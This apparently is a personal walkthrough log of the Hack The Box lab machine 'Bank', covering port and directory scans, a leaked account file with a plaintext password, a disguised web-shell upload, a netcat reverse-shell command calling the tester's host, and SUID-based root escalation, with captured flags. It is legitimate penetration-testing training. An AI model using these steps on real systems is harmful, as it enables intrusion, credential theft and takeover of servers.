@@ -1,0 +1,242 @@
+Machine-Name  :  Bank
+IP-Address    :  10.129.36.178
+
+Command-Line: sudo nmap -A 10.129.36.178
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 00:20 EST
+    Nmap scan report for 10.129.36.178
+    Host is up (0.061s latency).
+    Not shown: 997 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+    |   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+    |   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+    |_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
+    53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
+    | dns-nsid:
+    |_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+    |_http-server-header: Apache/2.4.7 (Ubuntu)
+    |_http-title: Apache2 Ubuntu Default Page: It works
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=11/6%OT=22%CT=1%CU=43525%PV=Y%DS=2%DC=T%G=Y%TM=5FA4DD5
+    OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+    OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Command-Line: kali@kali:~/HackingTools/dirsearch$ ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -u http://bank.htb
+Result:
+    [15:00:58] Starting:
+    [15:01:00] 301 -  305B  - /uploads  ->  http://bank.htb/uploads/
+    [15:01:00] 301 -  304B  - /assets  ->  http://bank.htb/assets/
+    [15:01:07] 301 -  301B  - /inc  ->  http://bank.htb/inc/
+    [15:06:04] 403 -  288B  - /server-status
+    [15:11:18] 301 -  314B  - /balance-transfer  ->  http://bank.htb/balance-transfer/
+
+    Task Completed
+
+
+Command-Line: sudo dirb http://10.129.36.178
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Sun Nov  8 15:28:15 2020
+    URL_BASE: http://10.129.36.178/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.36.178/ ----
+    + http://10.129.36.178/index.html (CODE:200|SIZE:11510)
+    + http://10.129.36.178/server-status (CODE:403|SIZE:293)
+
+    -----------------
+    END_TIME: Sun Nov  8 15:32:53 2020
+    DOWNLOADED: 4613 - FOUND: 2
+
+
+Command-Line: sudo dirb http://10.129.36.178 -X .php
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Sun Nov  8 15:30:20 2020
+    URL_BASE: http://10.129.36.178/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.36.178/ ----
+
+    -----------------
+    END_TIME: Sun Nov  8 15:35:03 2020
+    DOWNLOADED: 4613 - FOUND: 0
+
+
+
+Command-Line: sudo dirb http://10.129.36.178
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Sun Nov  8 15:39:15 2020
+    URL_BASE: http://10.129.36.178/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.36.178/ ----
+
+    -----------------
+    END_TIME: Sun Nov  8 15:44:03 2020
+    DOWNLOADED: 4613 - FOUND: 0
+
+
+DISCOVERY: http://bank.htb/balance-transfer/
+Result: A large amount of encrypted files. Each file contains the following:
+File: 09ed7588d1cd47ffca297cc7dac22c52.acc	2017-06-15 09:50 	581
+    ++OK ENCRYPT SUCCESS
+    +=================+
+    | HTB Bank Report |
+    +=================+
+
+    ===UserAccount===
+    Full Name: qHMZdvqNTZrw5rwqdD1YPV0V3HbbK4bbMYaZtBNnAeTFGq6U38SS3TO6B0il5uxRsHQViEjSSdyyDFsHNlAQfpXQpfcuKJmcqd8JRsCJFaijPL0D7Btm0rcpGoUr8hEz
+    Email: uMileU5U5odV9ezgP2CPtPfaeaCmrgVW2eih9nbfMpbVDKcsMPigExrTH3f9jb5mpnDzLPOxfZtSJFlwuDM9ae2Shi1Bt6XTuBsfrgNGfgzZVUvqxizIwBAOTBpnIngc
+    Password: YIspZf6fvFerzJR72qPy2pnW1MjK9AW8ipyiEEx9kLAUvs1xSR6UhtQiga2qKZy3o7l3MTd6EO0ag2I8TO3aiUtz4wZPvySUFeYr7bxMZyWfAFouusEMm7mrDlg9T94y
+    CreditCards: 2
+    Transactions: 6
+    Balance: 65437 .
+    ===UserAccount===
+
+
+Command-Line: wget -r http://bank.htb/balance-transfer/
+Result: /Bank/bank.htb
+
+Command-Line: cd bank.htb/balance-transfer
+Result: Rows of encrypted files.
+
+Command-Line: wc -c *.acc | sort -nr
+Result: 257 68576f20e9732f1b2edc4df5b8533230.acc
+Contents-Of-File 68576f20e9732f1b2edc4df5b8533230.acc:
+    --ERR ENCRYPT FAILED
+    +=================+
+    | HTB Bank Report |
+    +=================+
+
+    ===UserAccount===
+    Full Name: Christos Christopoulos
+    Email: chris@bank.htb
+    Password: !##HTBB4nkP4ssw0rd!##
+    CreditCards: 5
+    Transactions: 39
+    Balance: 8842803 .
+    ===UserAccount===
+
+
+Login-Attempt:
+    URL  : http://bank.htb/login
+    Email: chris@bank.htb
+    Pass : !##HTBB4nkP4ssw0rd!##
+
+    Result: ***ACCESS GRANTED***
+
+Next-Steps: "Navigated to support page and uploaded an image file to create reverse shell. Clicked on uploaded link and created reverse shell"
+
+Changed proxy to go through Burpsuite.
+Burpsuite intercepted the image upload.
+Changed image name to "reverse.htb"
+**Image Upload SUCCESS**
+
+Clicked on image.
+Result:
+    GIF8 uk47
+Command-Line: nc -nlvp 8081
+Result:
+    listening on [any] 8081 ...
+URL: http://bank.htb/uploads/reverse.htb?cmd=nc -e /bin/sh 10.10.14.88 8081
+Result:
+    connect to [10.10.14.88] from (UNKNOWN) [10.129.36.178] 50912
+Reverse-Shell: python -c 'import pty;pty.spawn("/bin/bash");'
+Result:
+    www-data@bank:/var/www/bank/uploads$
+Reverse-Shell: stty raw -echo
+Result: Terminal quit doubling the characters. Unable to "delete".
+Command-Line: echo $TERM
+Result: screen
+Reverse-Shell: export TERM=screen
+Result: Ability to "clear" the screen.
+**REVERSE-SHELL SUCCESS**
+
+Reverse-Shell: cd /home/chris
+Reverse-Shell: cat user.txt
+Result:
+    8743r78f784378hr47437hhwf
+
+
+*** USER OWNED ***
+
+
+Reverse-Shell: find / -perm -4000 2>/dev/null
+Result:
+    /var/htb/bin/emergency
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    /usr/lib/policykit-1/polkit-agent-helper-1
+    /usr/bin/at
+    /usr/bin/chsh
+    /usr/bin/passwd
+    /usr/bin/chfn
+    /usr/bin/pkexec
+    /usr/bin/newgrp
+    /usr/bin/traceroute6.iputils
+    /usr/bin/gpasswd
+    /usr/bin/sudo
+    /usr/bin/mtr
+    /usr/sbin/uuidd
+    /usr/sbin/pppd
+    /bin/ping
+    /bin/ping6
+    /bin/su
+    /bin/fusermount
+    /bin/mount
+    /bin/umount
+
+Reverse-Shell: /var/htb/bin/emergency
+Result: **ROOT ACCESS**
+Reverse-Shell: cat root/root.txt
+Result:
+    d5be56adc67b488f81a4b9de30c8a68e
+*** ROOT OWNED ***
+
+
+***FINISHED***
